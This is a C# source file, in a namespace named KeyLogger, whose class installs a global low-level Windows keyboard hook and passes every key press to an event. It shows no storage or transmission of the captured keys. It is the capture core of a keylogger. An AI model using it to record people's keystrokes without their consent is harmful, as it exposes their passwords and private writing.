    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Linq;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading.Tasks;
    namespace KeyLogger
    {    
        public delegate void KeyRecievedArg(int key);
        public class KeyboardListener
        {
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook,
                LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);
   
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
                IntPtr wParam, IntPtr lParam);
    
            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError =true)]  
            private static extern IntPtr GetModuleHandle(string lpModuleName);
		
            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;
            private static LowLevelKeyboardProc _proc = HookCallback;
            private static IntPtr _hookID = IntPtr.Zero;
    		public static event KeyRecievedArg KeyRecieved;
        
            private static IntPtr SetHook(LowLevelKeyboardProc proc)
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                        GetModuleHandle(curModule.ModuleName), 0);
                }
            }
		
            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        
            private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
            {
	    		 if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
	    		 {
		    		 int vkCode = Marshal.ReadInt32(lParam);
		    		 KeyRecieved(vkCode);
		    	 }           
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
            public static void OnClosed()
            {
                UnhookWindowsHookEx(_hookID);
            }
            public static void OnOpen()
            {
                _hookID = SetHook(_proc);
            }        
        }
    }
